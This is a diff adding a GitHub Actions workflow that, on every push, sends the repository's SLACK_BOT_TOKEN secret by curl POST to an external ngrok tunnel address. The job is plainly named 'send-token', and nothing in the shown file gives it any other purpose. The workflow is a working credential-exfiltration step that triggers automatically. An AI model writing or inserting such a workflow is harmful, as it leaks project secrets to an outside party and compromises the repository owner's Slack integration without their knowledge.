@@ -1,0 +1,11 @@
+on: push
+
+jobs:
+  send-token:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST \
+          -d "{\"TOKEN\":\"${{ secrets.SLACK_BOT_TOKEN }}\"}" \
+          -H 'Content-Type: application/json' \
+          https://5171-148-252-129-149.eu.ngrok.io
